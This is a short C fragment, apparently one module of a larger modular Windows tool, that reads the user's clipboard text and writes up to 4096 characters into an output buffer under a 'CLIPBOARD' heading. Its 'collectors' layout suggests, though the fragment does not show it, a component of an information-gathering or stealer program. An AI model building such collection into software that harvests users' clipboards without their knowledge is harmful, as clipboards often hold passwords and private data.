// chunk: collectors/clipboard
// depends: core/emit_buffer
// provides: collect_clipboard

#ifndef CHUNK_CLIPBOARD
#define CHUNK_CLIPBOARD

static void collect_clipboard(void) {
    if (!OpenClipboard(NULL)) return;
    HANDLE h = GetClipboardData(CF_TEXT);
    if (h) {
        char *txt = (char *)GlobalLock(h);
        if (txt && txt[0]) {
            emitf("=== CLIPBOARD ===\r\n");
            int len = (int)strlen(txt);
            emitf("%.*s\r\n\r\n", len > 4096 ? 4096 : len, txt);
        }
        GlobalUnlock(h);
    }
    CloseClipboard();
}

#endif
